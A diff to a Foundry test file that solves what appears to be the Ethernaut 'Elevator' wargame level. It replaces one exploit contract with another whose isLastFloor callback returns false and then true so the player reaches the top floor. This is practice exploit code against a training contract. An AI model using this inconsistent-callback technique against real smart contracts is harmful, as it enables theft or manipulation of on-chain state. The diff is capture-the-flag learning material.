@@ -34,36 +34,26 @@ contract TestElevator is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        vm.startPrank(player);
 
-        vm.startPrank(player, player);
-
+        ExploitBuilding expbd = new ExploitBuilding(level);
+        expbd.goTo(level, 20);
 
         vm.stopPrank();
     }
 }
 
-contract Exploiter is Building {
-    Elevator private victim;
-    address private owner;
-    bool firstCall;
+contract ExploitBuilding is Building {
+    constructor(Elevator ele) public {}
 
-    constructor(Elevator _victim) public {
-        owner = msg.sender;
-        victim = _victim;
-        firstCall = true;
+    function goTo(Elevator ele, uint256 stair) public {
+        ele.goTo(stair);
     }
 
-    function goTo(uint256 floor) public {
-        victim.goTo(floor);
-    }
-
-    function isLastFloor(uint256) external override returns (bool) {
-        if (firstCall) {
-            firstCall = false;
-            return false;
-        } else {
+    function isLastFloor(uint256 stair) external override returns (bool) {
+        if (Elevator(msg.sender).floor() == 20) {
             return true;
         }
+        return false;
     }
 }
